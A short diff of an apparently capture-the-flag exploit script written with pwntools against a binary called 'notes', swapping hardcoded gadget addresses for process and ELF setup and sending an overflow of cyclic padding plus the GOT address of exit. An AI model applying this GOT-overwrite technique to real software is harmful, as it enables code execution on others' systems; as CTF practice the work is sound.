@@ -1,7 +1,4 @@
-#notes
-system = 0x400577
-ret = 0x40101a
-call_rax = 0x401014
+from pwn import *
 
 def add(index):
     io.recv()
@@ -18,7 +15,9 @@ def edit(index, content):
     io.sendline(str(index).encode())
     io.recvline()
     io.sendline(content)
-io = start()
+
+io = process('../../TFC/notes')
+elf = context.binary = ELF('../../TFC/notes', checksec=False)
 add(0)
 add(1)
 edit(0, cyclic(32) + pack(elf.got.exit))
